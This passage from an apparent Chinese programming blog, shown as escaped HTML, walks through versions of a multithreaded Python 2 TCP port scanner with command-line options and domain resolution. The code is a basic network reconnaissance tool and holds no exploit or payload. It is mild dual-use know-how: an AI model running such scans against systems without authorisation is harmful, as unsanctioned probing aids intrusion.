&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pool&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;pool&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'本次端口扫描共用时 '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;datetime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;now&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t1&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;演示：
&lt;img src=&quot;https://i.loli.net/2019/06/03/5cf4c2ba33b1e88447.gif&quot; alt=&quot;portscan.gif&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;version-12-optparse库&quot;&gt;Version 1.2 (optparse库)&lt;/h2&gt;
&lt;h3 id=&quot;使用optparse对python使用过程的命令进行解析&quot;&gt;使用optparse对python使用过程的命令进行解析&lt;/h3&gt;
&lt;p&gt;更新日志： &lt;br /&gt;
调用python的optparse库，实现在运行该脚本的过程中使用“–host”等方式指定参数名称&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python
# -*- coding: UTF-8 -*-
&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;optparse&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;datetime&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;datetime&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;multiprocessing.dummy&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Pool&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ThreadPool&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;------------------------------------------------------------------------------------------&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;|             ___              _   _                            _                        |&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;|   ___ ___  / _ &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;  ___  _ __ | |_| |_ _   _   _ __   ___  _ __| |_ ___  ___ __ _ _ __   |&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;|  / __/ _ &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;| | | |/ _ &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;| '_ &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;| __| __| | | | | '_ &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; / _ &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;| '__| __/ __|/ __/ _` | '_ &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;  |&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;| | (_| (_) | |_| | (_) | | | | |_| |_| |_| | | |_) | (_) | |  | |_&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;__ &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; (_| (_| | | | | |&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;|  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;___&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;___/ &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;___/ &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;___/|_| |_|&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;__|&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;__|&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;__, | | .__/ &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;___/|_|   &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;__|___/&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;___&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;__,_|_| |_| |&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;|                                      |___/  |_|                                        |&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;------------------------------------------------------------------------------------------&quot;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;optparse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OptionParser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;usage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'python portscan.py -H 127.0.0.1 -P 60,90 -T 32'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;co0ontty portscan version:1.2&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add_option&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'-H'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'--Host'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'host'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'store'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;metavar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'host'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;help&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Enter Host!!'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add_option&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'-P'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'--Port'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'port'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;metavar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'port'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'1,10000'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;help&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Enter Port!!'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add_option&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'-T'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'--Thread'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'thread'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;metavar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'thread'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;set_defaults&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;thread&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
&lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parse_args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# optparse.OptionParser usage=''介绍使用方式
# dest='host',传递参数到名为host的变量
# type='str',传递参数的类型
# metavar='host', help中参数后的名称
# help=''，help中的语句
# parse.set_defaults(thread=32)  设置参数默认值的另一种方式
# 当你将所有的命令行参数都定义好了的时候，我们需要调用parse_args()方法add_option()函数依次传入的参数： options,args=parse.parse_args()
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;portList&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;,&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;startPort&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;portList&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;endPort&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;portList&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;remote_server_ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gethostbyname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# remote_server_info = socket.gethostbyname_ex(host)
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ports&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;openPort&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'正在对目标： '&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remote_server_ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'  进行  '&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'  线程扫描'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setdefaulttimeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;scan_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect_ex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remote_server_ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; 
            &lt;span class=&quot;n&quot;&gt;openPort&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;startPort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endPort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ports&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
&lt;span class=&quot;c1&quot;&gt;# 扫描开始
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;datetime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;now&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# 创建线程
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pool&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ThreadPool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;processes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;results&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pool&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;scan_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;pool&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;pool&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;openPort&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'本次端口扫描共用时 '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;datetime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;now&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t1&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h2 id=&quot;version-13-gethostbyname_ex&quot;&gt;Version 1.3 （gethostbyname_ex）&lt;/h2&gt;
&lt;h3 id=&quot;使用gethostbyname_ex函数获取目标的域名ip等信息&quot;&gt;使用gethostbyname_ex函数获取目标的域名、ip等信息&lt;/h3&gt;
&lt;p&gt;更新日志：&lt;br /&gt;
1、使用gethostbyname_ex 函数实现对输入的域名进行解析&lt;br /&gt;
2、使用-D 参数传递域名，扫描器将对域名相关的ip进行端口扫描 &lt;br /&gt;
3、对代码进行了模块化操作&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python
# -*- coding: UTF-8 -*-
&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;optparse&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;datetime&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;datetime&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;multiprocessing.dummy&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Pool&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ThreadPool&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;------------------------------------------------------------------------------------------&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;|             ___              _   _                            _                        |&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;|   ___ ___  / _ &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;  ___  _ __ | |_| |_ _   _   _ __   ___  _ __| |_ ___  ___ __ _ _ __   |&quot;&lt;/span&gt;
